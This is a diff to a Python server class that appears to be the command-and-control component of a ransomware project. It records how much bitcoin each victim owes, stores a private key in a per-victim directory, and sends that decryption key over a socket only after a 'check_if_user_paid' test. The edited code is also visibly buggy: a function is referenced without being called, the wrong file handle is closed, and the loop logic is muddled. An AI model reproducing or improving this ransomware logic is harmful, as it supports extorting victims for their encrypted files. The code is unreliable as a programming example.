@@ -167,35 +167,37 @@ class Server:
                         if self._transfer_done == True:
                             bitcoin_needed = float(base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT))
                             break
-                    break
+                    
                    
                 
                 
 
                     
-                else:
-                
-                    # sends decryption key  
-                    """ Opening and reading the private key file. """
-                    key_path = os.path.join(victim_dir, 'private_key.pem')
+                while (True):
+                    if(check_if_user_paid):
+                        # sends decryption key  
+                        """ Opening and reading the private key file. """
+                        key_path = os.path.join(victim_dir, 'private_key.pem')
 
-                    priv_key = open(key_path, "rb")
-                    data = priv_key.read()
+                        priv_key = open(key_path, "rb")
+                        data = priv_key.read()
 
-                    """ Sending the filename to the server. """
-                    self._socket.sendall(base64.b64encode('private_key.pem'.encode(Server.FORMAT)))
-                    msg = base64.b64decode(self._socket.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
-                    print("[CLIENT]: "+msg)
+                        """ Sending the filename to the server. """
+                        self._socket.sendall(base64.b64encode('private_key.pem'.encode(Server.FORMAT)))
+                        msg = base64.b64decode(self._socket.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+                        print("[CLIENT]: "+msg)
 
-                    """ Sending the file data to the server. """
-                    self._socket.sendall(base64.b64encode(data.encode(Server.FORMAT)))
-                    msg = base64.b64decode(self._socket.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
-                    print("[CLIENT]: "+msg)
-        
-                    """ Closing the file. """
-                    file.close()         
+                        """ Sending the file data to the server. """
+                        self._socket.sendall(base64.b64encode(data.encode(Server.FORMAT)))
+                        msg = base64.b64decode(self._socket.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+                        print("[CLIENT]: "+msg)
 
-
+                        """ Closing the file. """
+                        file.close()  
+                        break
+                    break
+                    
+                    
 if __name__ == '__main__':
     logging.basicConfig(level=logging.DEBUG)
 
